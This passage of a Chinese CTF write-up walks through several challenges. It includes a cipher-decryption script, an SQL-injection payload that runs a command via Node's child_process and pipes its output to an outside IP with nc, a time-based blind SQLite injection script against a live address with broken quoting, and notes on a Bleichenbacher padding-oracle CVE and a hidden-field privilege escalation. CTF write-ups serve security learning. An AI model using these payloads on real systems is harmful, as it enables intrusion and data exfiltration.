class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>连接成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccdd4969.png" alt="image-20240524234544979"></p>
<p>直接读Flag[2]和Flag[1]：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd03d13.png" alt="image-20240524234845635"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd1a720.png" alt="image-20240524234905985"></p>
<p>把源码扒下来康康</p>
<p>太多了 这里就不粘下来了</p>
<p>可以找到FLAG3的相关代码 应该是它的加密逻辑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long <span class="keyword">as</span> b2l, long_to_bytes <span class="keyword">as</span> l2b</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mode</span>(<span class="title class_ inherited__">Enum</span>):</span><br><span class="line">    ECB = <span class="number">0x01</span></span><br><span class="line">    CBC = <span class="number">0x02</span></span><br><span class="line">    CFB = <span class="number">0x03</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key, iv=<span class="literal">None</span></span>):</span><br><span class="line">        self.BLOCK_SIZE = <span class="number">64</span></span><br><span class="line">        self.KEY = [b2l(key[i:i + self.BLOCK_SIZE // <span class="number">16</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(key), self.BLOCK_SIZE // <span class="number">16</span>)]</span><br><span class="line">        self.DELTA = <span class="number">0x9e3779b9</span></span><br><span class="line">        self.IV = iv</span><br><span class="line">        self.ROUNDS = <span class="number">64</span></span><br><span class="line">        </span><br><span class="line">        self.mode = Mode.CBC <span class="keyword">if</span> iv <span class="keyword">else</span> Mode.ECB</span><br><span class="line">        <span class="keyword">if</span> iv <span class="keyword">and</span> <span class="built_in">len</span>(iv) * <span class="number">8</span> != self.BLOCK_SIZE:</span><br><span class="line">            self.mode = Mode.CFB</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_xor</span>(<span class="params">self, a, b</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(_a ^ _b <span class="keyword">for</span> _a, _b <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt_block</span>(<span class="params">self, msg</span>):</span><br><span class="line">        m0, m1 = b2l(msg[:<span class="number">4</span>]), b2l(msg[<span class="number">4</span>:])</span><br><span class="line">        msk = (<span class="number">1</span> &lt;&lt; (self.BLOCK_SIZE // <span class="number">2</span>)) - <span class="number">1</span></span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(self.ROUNDS):</span><br><span class="line">            s += self.DELTA</span><br><span class="line">            m0 = ((m1 &lt;&lt; <span class="number">4</span>) + self.KEY[_ % <span class="built_in">len</span>(self.KEY)]) ^ (m1 + s) ^ ((m1 &gt;&gt; <span class="number">5</span>) + self.KEY[(_ + <span class="number">1</span>) % <span class="built_in">len</span>(self.KEY)])</span><br><span class="line">            m1 = ((m0 &lt;&lt; <span class="number">4</span>) + self.KEY[(_ + <span class="number">2</span>) % <span class="built_in">len</span>(self.KEY)]) ^ (m0 + s) ^ ((m0 &gt;&gt; <span class="number">5</span>) + self.KEY[(_ + <span class="number">3</span>) % <span class="built_in">len</span>(self.KEY)])</span><br><span class="line">            m0 &amp;= msk</span><br><span class="line">            m1 &amp;= msk</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> l2b((m0 &lt;&lt; (self.BLOCK_SIZE // <span class="number">2</span>)) | m1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, msg</span>):</span><br><span class="line">        msg_padded = pad(msg, self.BLOCK_SIZE // <span class="number">8</span>)</span><br><span class="line">        blocks = [msg_padded[i:i + self.BLOCK_SIZE // <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg_padded), self.BLOCK_SIZE // <span class="number">8</span>)]</span><br><span class="line">        </span><br><span class="line">        ciphertext = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.mode == Mode.ECB:</span><br><span class="line">            ciphertext = <span class="string">b&#x27;&#x27;</span>.join(self.encrypt_block(block) <span class="keyword">for</span> block <span class="keyword">in</span> blocks)</span><br><span class="line">        <span class="keyword">elif</span> self.mode == Mode.CBC:</span><br><span class="line">            X = self.IV</span><br><span class="line">            <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">                encrypted_block = self.encrypt_block(self._xor(X, block))</span><br><span class="line">                ciphertext += encrypted_block</span><br><span class="line">                X = encrypted_block</span><br><span class="line">        <span class="keyword">elif</span> self.mode == Mode.CFB:</span><br><span class="line">            X = self.IV</span><br><span class="line">            <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">                output = self.encrypt_block(X)</span><br><span class="line">                encrypted_block = self._xor(output, block)</span><br><span class="line">                ciphertext += encrypted_block</span><br><span class="line">                X = encrypted_block</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    KEY = get_random_bytes(<span class="number">16</span>)</span><br><span class="line">    IV = get_random_bytes(<span class="number">8</span>)</span><br><span class="line">    cipher = Cipher(KEY, IV)</span><br><span class="line">    FLAG = <span class="string">b&#x27;xxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">    ct = cipher.encrypt(FLAG)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;KEY: <span class="subst">&#123;KEY.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;IV: <span class="subst">&#123;IV.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Ciphertext: <span class="subst">&#123;ct.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接让AI解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long <span class="keyword">as</span> b2l, long_to_bytes <span class="keyword">as</span> l2b</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mode</span>(<span class="title class_ inherited__">Enum</span>):</span><br><span class="line">    ECB = <span class="number">0x01</span></span><br><span class="line">    CBC = <span class="number">0x02</span></span><br><span class="line">    CFB = <span class="number">0x03</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key, iv=<span class="literal">None</span></span>):</span><br><span class="line">        self.BLOCK_SIZE = <span class="number">64</span></span><br><span class="line">        self.KEY = [b2l(key[i:i + self.BLOCK_SIZE // <span class="number">16</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(key), self.BLOCK_SIZE // <span class="number">16</span>)]</span><br><span class="line">        self.DELTA = <span class="number">0x9E3779B9</span></span><br><span class="line">        self.IV = iv</span><br><span class="line">        self.ROUNDS = <span class="number">64</span></span><br><span class="line">        </span><br><span class="line">        self.mode = Mode.CBC <span class="keyword">if</span> iv <span class="keyword">else</span> Mode.ECB</span><br><span class="line">        <span class="keyword">if</span> iv <span class="keyword">and</span> <span class="built_in">len</span>(iv) * <span class="number">8</span> != self.BLOCK_SIZE:</span><br><span class="line">            self.mode = Mode.CFB</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Mode set to CFB due to IV length mismatch.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Mode: <span class="subst">&#123;self.mode&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_xor</span>(<span class="params">self, a, b</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Perform XOR operation on two byte sequences.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(_a ^ _b <span class="keyword">for</span> _a, _b <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">self, ct</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Decrypt a single block.&quot;&quot;&quot;</span></span><br><span class="line">        m0, m1 = b2l(ct[:<span class="number">4</span>]), b2l(ct[<span class="number">4</span>:])</span><br><span class="line">        msk = (<span class="number">1</span> &lt;&lt; (self.BLOCK_SIZE // <span class="number">2</span>)) - <span class="number">1</span></span><br><span class="line">        s = self.DELTA * self.ROUNDS</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.ROUNDS - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            m1 = ((m0 &lt;&lt; <span class="number">4</span>) + self.KEY[(self.ROUNDS - <span class="number">1</span> - i + <span class="number">2</span>) % <span class="built_in">len</span>(self.KEY)]) ^ \</span><br><span class="line">                 (m0 + s) ^ \</span><br><span class="line">                 ((m0 &gt;&gt; <span class="number">5</span>) + self.KEY[(self.ROUNDS - <span class="number">1</span> - i + <span class="number">3</span>) % <span class="built_in">len</span>(self.KEY)])</span><br><span class="line">            m1 &amp;= msk</span><br><span class="line">            m0 = ((m1 &lt;&lt; <span class="number">4</span>) + self.KEY[(self.ROUNDS - <span class="number">1</span> - i) % <span class="built_in">len</span>(self.KEY)]) ^ \</span><br><span class="line">                 (m1 + s) ^ \</span><br><span class="line">                 ((m1 &gt;&gt; <span class="number">5</span>) + self.KEY[(self.ROUNDS - <span class="number">1</span> - i + <span class="number">1</span>) % <span class="built_in">len</span>(self.KEY)])</span><br><span class="line">            m0 &amp;= msk</span><br><span class="line">            s -= self.DELTA</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> l2b((m0 &lt;&lt; (self.BLOCK_SIZE // <span class="number">2</span>)) | m1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ct</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Decrypt the ciphertext.&quot;&quot;&quot;</span></span><br><span class="line">        blocks = [ct[i:i + self.BLOCK_SIZE // <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ct), self.BLOCK_SIZE // <span class="number">8</span>)]</span><br><span class="line">        msg = <span class="string">b&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> self.mode == Mode.ECB:</span><br><span class="line">            msg = <span class="string">b&#x27;&#x27;</span>.join(self.decrypt_block(block) <span class="keyword">for</span> block <span class="keyword">in</span> blocks)</span><br><span class="line">        <span class="keyword">elif</span> self.mode == Mode.CBC:</span><br><span class="line">            X = self.IV</span><br><span class="line">            <span class="keyword">for</span> ct_block <span class="keyword">in</span> blocks:</span><br><span class="line">                decrypted_block = self._xor(X, self.decrypt_block(ct_block))</span><br><span class="line">                msg += decrypted_block</span><br><span class="line">                X = ct_block</span><br><span class="line">        <span class="keyword">elif</span> self.mode == Mode.CFB:</span><br><span class="line">            X = self.IV</span><br><span class="line">            <span class="keyword">for</span> ct_block <span class="keyword">in</span> blocks:</span><br><span class="line">                output = self.encrypt_block(X)  <span class="comment"># Assuming encrypt_block exists for CFB mode</span></span><br><span class="line">                decrypted_block = self._xor(output, ct_block)</span><br><span class="line">                msg += decrypted_block</span><br><span class="line">                X = ct_block</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> unpad(msg, self.BLOCK_SIZE // <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    KEY = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;3362623866656338306539313238353733373566366338383563666264386133&quot;</span>)</span><br><span class="line">    IV = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;64343537373337663034346462393931&quot;</span>)</span><br><span class="line">    cipher = Cipher(KEY, IV)</span><br><span class="line">    ct = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;1cb8db8cabe8edbbddb211f3da4869cdee3bcfb850bce808&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;FLAG: <span class="subst">&#123;cipher.decrypt(ct)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccc63140.png" alt="image-20240525001118426"></p>
<p>然后把四段flag连起来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I&#123;n_zIcCmoSFdoLEoaeoClrai_unIUCaehJST_k&#125;</span><br></pre></td></tr></table></figure>

<p>栅栏解密</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcccee58b.png" alt="image-20240525001411739"></p>
<h4 id="这题我出不了了"><a href="#这题我出不了了" class="headerlink" title="这题我出不了了"></a>这题我出不了了</h4><p>进来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd6050c.png" alt="image-20240525001948352"></p>
<p>网上查找资料 发现有类似的2017年的HITCON SQL So Hard(over-rainbow.cn)</p>
<p>直接跑脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &quot;union&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&#x27;,&#x27;&#x27;)/*%s*/returning(1)as&quot;\\&#x27;/*&quot;,(1)as&quot;\\&#x27;*/-(a=`child_process`)/*&quot;,(2)as&quot;\\&#x27;*/-(b=`/printFlag|nc 121.43.127.41 3333`)/*&quot;,(3)as&quot;\\&#x27;*/-console.log(process.mainModule.require(a).exec(b))]=1//&quot;--&quot;&quot;&quot;</span> % (</span><br><span class="line">            <span class="string">&#x27; &#x27;</span> * <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">16</span>)</span><br><span class="line">username = <span class="built_in">str</span>(randint(<span class="number">1</span>, <span class="number">65535</span>)) + <span class="built_in">str</span>(randint(<span class="number">1</span>, <span class="number">65535</span>)) + <span class="built_in">str</span>(randint(<span class="number">1</span>, <span class="number">65535</span>))</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: username + payload,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;AAAAAA&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">r = requests.post(<span class="string">&#x27;http://xxxxxx:[port]/register_7D85tmEhhAdgGu92&#x27;</span>, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>反弹成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcce2b84d.png" alt="image-20240525002256811"></p>
<h4 id="与时俱进"><a href="#与时俱进" class="headerlink" title="与时俱进"></a>与时俱进</h4><p>进来研究一下</p>
<p>发现是CVE-2022-28346</p>
<p>F12发现hint</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd894ba.png" alt="image-20240525002741686"></p>
<p>是一个注释的nick_name字段 并且提示是aggregate</p>
<p>测试一下 发现无回显 但是字段会被出来</p>
<p>可能是时间盲注</p>
<p>测试一下数据库</p>
<p>发现django默认使用sqlite作为数据库</p>
<p>直接跑脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">time_inject</span>(<span class="params">condition</span>):</span><br><span class="line">url = <span class="string">&quot;http://101.200.138.180:8003/inquiry/&quot;</span> headers = &#123;&#125;</span><br><span class="line">cookies = &#123; <span class="string">&quot;csrftoken&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="comment">#自己的</span></span><br><span class="line">          &#125;</span><br><span class="line">data=&#123;csrfmiddlewaretoken<span class="string">&quot;: &quot;</span><span class="string">&quot;,# 填自己的</span></span><br><span class="line"><span class="string">     &quot;</span>sel_value<span class="string">&quot;: &quot;</span>name<span class="string">&quot;, &quot;</span>nick_name<span class="string">&quot;: f&#x27;name&quot;</span>,(<span class="keyword">case</span>  when(&#123;condition&#125;)                                      randomblob(<span class="number">1000000000</span>) <span class="keyword">else</span> <span class="number">0</span> end),<span class="string">&quot;1&#x27;</span></span><br><span class="line"><span class="string">     &#125;</span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        start = time.time()</span></span><br><span class="line"><span class="string">        response = requests.post(url,headers=headers,cookies=cookies,data=data)</span></span><br><span class="line"><span class="string">        end = time.time()</span></span><br><span class="line"><span class="string">        time_cost = end - start</span></span><br><span class="line"><span class="string">        print(&quot;</span>time cost: <span class="string">&quot;, time_cost)</span></span><br><span class="line"><span class="string">        if time_cost &gt; 3:</span></span><br><span class="line"><span class="string">            return True</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            return False</span></span><br><span class="line"><span class="string">        except:</span></span><br><span class="line"><span class="string">            continue</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def get_length(var_name):</span></span><br><span class="line"><span class="string">    for i in range(1, 1000):</span></span><br><span class="line"><span class="string">        if time_inject(f&quot;</span>length(&#123;var_name&#125;)=&#123;i&#125;<span class="string">&quot;):</span></span><br><span class="line"><span class="string">            return i</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def get_char(var_name, index):</span></span><br><span class="line"><span class="string">    alphabet = string.printable</span></span><br><span class="line"><span class="string">    for c in alphabet:</span></span><br><span class="line"><span class="string">        if time_inject(f&quot;</span>substr(&#123;var_name&#125;,&#123;index&#125;,<span class="number">1</span>)=<span class="string">&#x27;&#123;c&#125;&#x27;</span><span class="string">&quot;):</span></span><br><span class="line"><span class="string">            return c</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">def get_value(var_name, length):</span></span><br><span class="line"><span class="string">    for i in range(1, length + 1):</span></span><br><span class="line"><span class="string">        char = get_char(var_name, i)</span></span><br><span class="line"><span class="string">        if char is None:</span></span><br><span class="line"><span class="string">            result += f&quot;</span>&#123;&#123;&#123;i&#125;&#125;&#125;<span class="string">&quot; else:</span></span><br><span class="line"><span class="string">                result += char</span></span><br><span class="line"><span class="string">                return result</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">def get_tables_name():</span></span><br><span class="line"><span class="string">    payload = &quot;</span>(select group_concat(tbl_name) <span class="keyword">from</span> sqlite_master wheretype=<span class="string">&#x27;table&#x27;</span> <span class="keyword">and</span> tbl_name NOT like <span class="string">&#x27;sqlite_%&#x27;</span>)<span class="string">&quot;</span></span><br><span class="line"><span class="string">    length = get_length(payload)</span></span><br><span class="line"><span class="string">    result = get_value(payload, length)</span></span><br><span class="line"><span class="string">    return result</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def get_schema(table_name):</span></span><br><span class="line"><span class="string">    payload = f&quot;</span>(select group_concat(sql) <span class="keyword">from</span> sqlite_master where <span class="built_in">type</span>=<span class="string">&#x27;table&#x27;</span> <span class="keyword">and</span> name=<span class="string">&#x27;&#123;table_name&#125;&#x27;</span>)<span class="string">&quot;</span></span><br><span class="line"><span class="string">    length = get_length(payload)</span></span><br><span class="line"><span class="string">    result = get_value(payload, length)</span></span><br><span class="line"><span class="string">    return result</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def get_data(table_name, column_name):</span></span><br><span class="line"><span class="string">    payload = f&quot;</span>(select group_concat(&#123;column_name&#125;) <span class="keyword">from</span> &#123;table_name&#125;)<span class="string">&quot;</span></span><br><span class="line"><span class="string">    length = get_length(payload)</span></span><br><span class="line"><span class="string">    result = get_value(payload, length)</span></span><br><span class="line"><span class="string">    return result</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def get_flag():</span></span><br><span class="line"><span class="string">    result = &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    for i in range(1, 14):</span></span><br><span class="line"><span class="string">        payload = &quot;</span>(select group_concat(flag) <span class="keyword">from</span> flag)<span class="string">&quot;</span></span><br><span class="line"><span class="string">        result += get_char(payload, i)</span></span><br><span class="line"><span class="string">        return result</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">def main():</span></span><br><span class="line"><span class="string">    print(get_flag())</span></span><br><span class="line"><span class="string">    # get_data(&#x27;flag&#x27;, &#x27;flag&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &quot;</span>__main__<span class="string">&quot;:</span></span><br><span class="line"><span class="string">    main()</span></span><br></pre></td></tr></table></figure>

<p>运行后得到 flag 是 url{i722vrr0}，但是交了不对，访问该地址<code>/i722vrr0</code>，可以下载到了一份源码</p>
<p>根目录下有公钥、密文文件，查看依赖看见 cryptography&#x3D;&#x3D;3.3.0。</p>
<p>审计之后，finally&#x2F;views 和 finally&#x2F;functions 存在加密解密逻辑，但是缺少私钥，无法解密，猜测私钥存在服务器上</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccf675ed.png" alt="image-20240525004449079"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccfb1939.png" alt="image-20240525004507660"></p>
<p>研究后发现是CVE-2023-50782</p>
<p>开始做的时候在这里卡死了 研究了好久</p>
<p>可以去查一下这个CVE</p>
<p>发现：</p>
<p>漏洞披露信息显示是 Bleichenbacher timing oracle attack，搜索相关信息，找到一 个 可 用 的 [脚 本](Classic Bleichenbacher RSA Padding Oracle Attack(github.com))</p>
<p>基于这个脚本 我们稍作修改即可使用</p>
<p>运行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccf30f9e.png" alt="image-20240525004851229"></p>
<h4 id="掉进阿帕奇工资"><a href="#掉进阿帕奇工资" class="headerlink" title="掉进阿帕奇工资"></a>掉进阿帕奇工资</h4><p>进来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcce8b8f2.png" alt="image-20240525005155621"></p>
<p>随便测试一下</p>
<p>随便注册一个 然后登录</p>
<p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccdcb75b.png" alt="image-20240525005416630"></p>
<p>不行 必须是manager 只是员工的不行</p>
<p>回头看我们的注册的地方</p>
<p>有一个职级别不能填写</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccc82970.png" alt="image-20240525005550582"></p>
<p>现在前端看一下 f12</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd14d1f.png" alt="image-20240525005722146"></p>
<p>发现job被隐藏了</p>
<p>抓包手动添加job&#x3D;admin</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcce24c62.png" alt="image-20240525010109434"></p>
<p>但是还是不行</p>
<p>注意我们还有一个信息重置没有用 </p>
<p>选择邮箱重置不行 要选择密保</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fcccb1695.png" alt="image-20240525011235183"></p>
<p>然后登录成功</p>
<p>发现&#x2F;gongzi_iscc.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd1f427.png" alt="image-20240525011345098"></p>
<p>随便输下呢 试下ls 11</p>
<p>返回jb</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccd60d0d.png" alt="image-20240525011432220"></p>
<p>应该是有xor</p>
<p>试下jb 11</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fccdd1714.png" alt="image-20240525011518395"></p>
<p>发现执行命令</p>
<p>我们通过看dockerfile </p>
<blockquote>
<p>secret.host:</p>
<p>image: nginx</p>
<p>container_name: secret.host</p>
<p>volumes:</p>
<p>- .&#x2F;:&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;</p>
</blockquote>
<p>猜测flag在<code>http://secret.host/flag</code></p>
<p>研究一下发现又是CVE</p>
